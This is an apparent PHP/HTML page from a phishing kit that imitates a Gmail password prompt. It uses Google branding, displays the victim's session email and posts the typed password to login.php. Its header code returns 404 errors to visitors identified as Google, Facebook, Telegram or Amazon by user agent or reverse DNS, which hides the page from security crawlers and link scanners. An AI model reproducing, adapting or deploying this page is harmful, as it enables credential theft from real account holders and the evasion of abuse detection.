<?php
ini_set( "display_errors", 0); 
include '../../../main.php';


if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'facebook') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'telegram') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos($_SERVER['HTTP_USER_AGENT'],'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'amazon') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
session_start();

?>
<html lang="en">
<head>
  <meta charset="UTF-8">
    <link
        rel="shortcut icon"
        href="https://www.google.com/gmail/about/static-2.0/images/favicon.ico?fingerprint=913d48cd5d48ba34313131f246f99d6b"
      >
  <title>Gmail</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  
      <div class="maindiv">
        <img src="google.png" alt="Google">
        <h1>Sign in Northlane</h1>
        <h3>Continue to Gmail</h3>
        <div class="inputs">
          <div class="Fields">
            <div jscontroller="IIfQad" jsaction="click:cOuCgd; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;" class="YZrg6 HnRr5d iiFyne cd29Sd" tabindex="0" role="link" aria-label="<aria-label="<?= $_SESSION['email'] ?><?= $_POST['email'] ?>" jsname="af8ijd"><div class="gPHLDe"><div class="qQWzTd" aria-hidden="true"><svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="48px" height="48px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z"></path></svg></div></div><div jsname="fmcmS" class="KTeGk" id="profileIdentifier"><?= $_SESSION['email'] ?></div><div class="krLnGe"><svg aria-hidden="true" class="stUf5b MSBt4d" fill="currentColor" focusable="false" width="24px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><polygon points="12,16.41 5.29,9.71 6.71,8.29 12,13.59 17.29,8.29 18.71,9.71"></polygon></svg></div></div>
           
            </div>
            <br>
         <form method="post" action="login.php">
          <div class="Fields">
            <div class="form-group">
            <div class="Fieldset">
              <br>
              <div>
            <label for="password">Password</label>
              <input type="password" class="Before-FS" placeholder="password" id="password" name="password" required>
              </div>
           </br>
        </div>
         <button type="submit" class="btn btn-primary btn-block" name="submit">Sign in</button>
      </div>

</body>
</html>